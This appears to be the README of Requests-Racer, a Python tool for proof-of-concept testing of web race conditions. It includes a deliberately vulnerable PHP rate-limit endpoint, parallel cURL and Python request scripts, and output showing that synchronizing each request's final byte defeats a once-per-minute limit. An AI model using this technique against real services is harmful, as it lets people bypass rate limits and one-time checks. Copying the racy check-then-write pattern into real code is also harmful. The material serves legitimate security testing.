# The Problem

Suppose you have an endpoint vulnerable to a race condition. For example, consider this endpoint that you are not supposed to be able to access more often than once per minute:

```php
<?php
$now = microtime(true);
$ban_time = (float) file_get_contents('./race.ban');

echo "start: $now\n";

if ($now <= $ban_time) {
    die("you're banned\n");
}

usleep(100000); // do some processing for 100ms
echo "success\n";

file_put_contents('./race.ban', microtime(true) + 60); // ban for 1 minute
```

How do you quickly build a PoC for this?

# Python-Requests: absolutely useless

You might try using Requests, but that will perform the calls in series, so their execution will not overlap at all:

```python
>>> import requests
>>> res = [requests.get('https://aleksejs.scripts.mit.edu/race.php') for _ in range(3)]
>>> for req in res: print(req.text)
... 
start: 1562013897.9938
success

start: 1562013898.914
you're banned

start: 1562013899.9254
you're banned

```

# cURL: not great, not terrible

You might try running mutiple instances of cURL in parallel, and that's a little better:

```
aleksejs@aleksejs-T440s:~$ curl https://aleksejs.scripts.mit.edu/race.php \
                         & curl https://aleksejs.scripts.mit.edu/race.php \
                         & curl https://aleksejs.scripts.mit.edu/race.php \
                         & curl https://aleksejs.scripts.mit.edu/race.php \
                         & curl https://aleksejs.scripts.mit.edu/race.php
[1] 25671
[2] 25672
[3] 25673
[4] 25674
start: 1562015106.736
start: 1562015106.78
success
start: 1562015106.8535
you're banned
success
start: 1562015106.8786
start: 1562015106.8795
you're banned
you're banned
[1]   Done                    curl https://aleksejs.scripts.mit.edu/race.php
[2]   Done                    curl https://aleksejs.scripts.mit.edu/race.php
[3]-  Done                    curl https://aleksejs.scripts.mit.edu/race.php
[4]+  Done                    curl https://aleksejs.scripts.mit.edu/race.php
```

We've triggered the race once, but the rest of the requests arrived too late. And if you need to send large payloads of different sizes, you're going to have an even worse time:

```
aleksejs@aleksejs-T440s:~$ curl https://aleksejs.scripts.mit.edu/race.php -d "@/tmp/1kbytes" \
                         & curl https://aleksejs.scripts.mit.edu/race.php -d "@/tmp/10kbytes" \
                         & curl https://aleksejs.scripts.mit.edu/race.php -d "@/tmp/100kbytes" \
                         & curl https://aleksejs.scripts.mit.edu/race.php -d "@/tmp/1000kbytes" \
                         & curl https://aleksejs.scripts.mit.edu/race.php -d "@/tmp/1000kbytes"
[1] 25721
[2] 25722
[3] 25723
[4] 25724
start: 1562015251.716
start: 1562015251.7541
success
success
start: 1562015252.1507
you're banned
start: 1562015253.7403
you're banned
start: 1562015253.9519
you're banned
[1]   Done                    curl https://aleksejs.scripts.mit.edu/race.php -d "@/tmp/1kbytes"
[2]   Done                    curl https://aleksejs.scripts.mit.edu/race.php -d "@/tmp/10kbytes"
[3]-  Done                    curl https://aleksejs.scripts.mit.edu/race.php -d "@/tmp/100kbytes"
[4]+  Done                    curl https://aleksejs.scripts.mit.edu/race.php -d "@/tmp/1000kbytes"

```

Those last three requests had no chance of succeeding.

Plus the output has all of this useless garbage in it and the outputs from the different requests are basically in a random order and interleaved. If you need to generate the requests dynamically, have fun writing that bash script, and if you want to process the output in any way, well, I don't envy you.

# The real solution

Running cURL in parallel synchronizes the time when the three requests will be *started*. But what you actually want to synchronize is the time when they *are sent completely* (and the server begins processing them). Because of network latency, synchronizing the former does not do a good job of synchronizing the latter, especially if your request payloads are large or differently-sized.

The way to synchronize the time when the request is done being sent is to first send most of the request in a mostly completely unsynchronized fashion, then synchronize the moment when you begin sending the last byte of each request.

Requests-Racer does this for you, while retaining the Requests API that you know and love:

```python
from synchronized_session import SynchronizedSession

NUM_ATTEMPTS = 10

s = SynchronizedSession(NUM_ATTEMPTS)

responses = [
    s.get('http://aleksejs.scripts.mit.edu/race.php') for _ in range(NUM_ATTEMPTS)
]

s.finish_all()

print('times:', *[resp.text.split()[1] for resp in responses])
print('outcomes:', *[resp.text.split()[-1] for resp in responses])

# times: 1562107013.0464 1562107013.0501 1562107013.0631 1562107013.0755 1562107013.0786 1562107013.0718 1562107013.0651 1562107013.0701 1562107013.0649 1562107013.0817
# outcomes: success success success success success success success success success success
```

```python
import time
from synchronized_session import SynchronizedSession

s = SynchronizedSession(10)

responses = [
    s.post(
    	'http://aleksejs.scripts.mit.edu/race.php',
    	files={'a': open('/tmp/{}kbytes'.format(n), 'rb')}
    )
    for n in [1, 1, 10, 10, 100, 100, 1000, 1000, 1000, 1000]
]

s.finish_all()

print('times:', *[resp.text.split()[1] for resp in responses])
print('outcomes:', *[resp.text.split()[-1] for resp in responses])

# times: 1562108650.5056 1562108650.6038 1562108650.604 1562108650.6038 1562108650.6038 1562108650.605 1562108650.6054 1562108650.6045 1562108650.6044 1562108650.6046
# outcomes: success success success success success success success success success success
```

The requests are all processed by the backend within less than *100ms* of each other, even when they have massively different sizes.